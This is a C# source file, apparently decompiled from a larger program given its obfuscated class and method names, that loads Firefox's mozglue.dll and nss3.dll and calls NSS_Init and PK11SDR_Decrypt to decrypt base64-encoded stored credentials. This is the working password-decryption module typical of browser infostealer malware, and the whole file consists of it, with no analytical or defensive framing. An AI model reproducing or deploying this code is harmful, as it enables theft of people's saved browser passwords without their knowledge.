using System;
using System.Runtime.InteropServices;
using System.Text;

public static class GClass13
{
	private static IntPtr intptr_0;

	private static IntPtr intptr_1;

	private static Class50.Delegate2 delegate2_0;

	private static Class50.Delegate4 delegate4_0;

	private static Class50.Delegate3 delegate3_0;

	public static bool smethod_0(string string_0)
	{
		try
		{
			intptr_1 = Class49.LoadLibrary(string_0 + "\\mozglue.dll");
			intptr_0 = Class49.LoadLibrary(string_0 + "\\nss3.dll");
			IntPtr procAddress = Class49.GetProcAddress(intptr_0, "NSS_Init");
			IntPtr procAddress2 = Class49.GetProcAddress(intptr_0, "PK11SDR_Decrypt");
			IntPtr procAddress3 = Class49.GetProcAddress(intptr_0, "NSS_Shutdown");
			delegate2_0 = (Class50.Delegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Class50.Delegate2));
			delegate4_0 = (Class50.Delegate4)Marshal.GetDelegateForFunctionPointer(procAddress2, typeof(Class50.Delegate4));
			delegate3_0 = (Class50.Delegate3)Marshal.GetDelegateForFunctionPointer(procAddress3, typeof(Class50.Delegate3));
			return true;
		}
		catch (Exception ex)
		{
			Console.WriteLine("Failed to load NSS\n" + ex);
			return false;
		}
	}

	public static void smethod_1()
	{
		delegate3_0();
		Class49.FreeLibrary(intptr_0);
		Class49.FreeLibrary(intptr_1);
	}

	public static bool smethod_2(string string_0)
	{
		return delegate2_0(string_0) == 0L;
	}

	public static string smethod_3(string string_0)
	{
		IntPtr intPtr = IntPtr.Zero;
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			intPtr = Marshal.AllocHGlobal(array.Length);
			Marshal.Copy(array, 0, intPtr, array.Length);
			Class50.Struct5 tsResult = default(Class50.Struct5);
			Class50.Struct5 tsData = default(Class50.Struct5);
			tsData.int_0 = 0;
			tsData.intptr_0 = intPtr;
			tsData.int_1 = array.Length;
			if (delegate4_0(ref tsData, ref tsResult, 0) == 0 && tsResult.int_1 != 0)
			{
				byte[] array2 = new byte[tsResult.int_1];
				Marshal.Copy(tsResult.intptr_0, array2, 0, tsResult.int_1);
				return Encoding.UTF8.GetString(array2);
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return null;
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(intPtr);
			}
		}
		return null;
	}

	public static string smethod_4(string string_0)
	{
		try
		{
			byte[] bytes = Encoding.Default.GetBytes(string_0);
			return Encoding.UTF8.GetString(bytes);
		}
		catch
		{
			return string_0;
		}
	}
}
